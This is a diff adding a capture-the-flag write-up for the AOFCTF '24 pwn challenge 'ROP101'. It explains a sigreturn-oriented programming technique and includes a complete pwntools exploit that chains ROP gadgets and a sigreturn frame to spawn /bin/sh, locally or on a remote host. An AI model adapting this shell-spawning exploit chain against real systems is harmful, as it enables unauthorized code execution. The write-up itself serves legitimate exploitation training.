@@ -1,0 +1,54 @@
+---
+title: AOFCTF '24 - Pwn - ROP101
+date: '2024-04-29'
+tags: ['pwn', 'aofctf', 'srop', 'read']
+draft: false
+summary: Utilizing SROP to write to a buffer and then using read syscall to write 0xF into rax to call rt_sigreturn
+---
+
+## Challenge Description
+
+![alt text](/static/writeups/aofctf-24/image-10.png)
+
+## Solution
+
+This challenge was a simple SROP challenge. However, since we didn't have a gadget that could directly control `RAX`, we would make use of `READ` to read in `0xF` bytes so that RAX would contain `rt_sigreturn` syscall opcode, and then we would simply create the sigreturn frame, and jump to it.
+
+The exploit for this is as follows, the only thing I added was a simple 2 second delay; that was to ensure that the bytes are sent properly.
+
+```py:exploit.py
+#!/usr/bin/env python3
+
+from pwn import *
+context.terminal = ["tmux", "splitw", "-h"]
+
+exe = "./rop101"
+elf = context.binary = ELF(exe)
+io = remote(sys.argv[1], int(sys.argv[2])) if args.REMOTE else process()
+# if args.GDB: gdb.attach(io, "b *main+40")
+# io = gdb.debug(exe, gdbscript="b *main+40")
+
+frame = SigreturnFrame()
+frame.rax = 0x3b
+frame.rdi = elf.bss(0)
+frame.rsi = 0
+frame.rdx = 0
+frame.rip = 0x401141
+
+payload = flat(
+    cyclic(24, n=8),
+    0x0000000000401144, # pop rsi; ret
+    elf.bss(0),
+    0x000000000040113f, # xor eax, eax; syscall,
+    0x0000000000401144, # pop rsi; ret
+    elf.bss(0)+0x10,
+    0x000000000040113f, # xor eax, eax; syscall
+    0x0000000000401141, # syscall
+    frame
+)
+io.send(payload)
+io.sendline(flat(b"/bin/sh\x00"))
+time.sleep(2)
+io.send(b"A"*0xF)
+io.interactive()
+```
